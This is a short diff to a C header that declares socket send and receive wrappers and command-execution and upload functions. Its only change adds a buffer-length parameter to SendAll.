@@ -143,7 +143,7 @@ int UPLOAD(SOCKET socket_descriptor, char* cmd);
 char* _exec(const char* cmd);
 
 // send-recv Wrapper
-void SendAll(SOCKET soc, const char* str);
+void SendAll(SOCKET soc, const char* str, unsigned long long bufferMaxLen);
 void Send(SOCKET soc, const char* str, unsigned long long bufferMaxLen);
 int Recv(SOCKET soc, char* _return, unsigned long long bufferMaxLen);
 int RecvAll(SOCKET soc, char* _return);
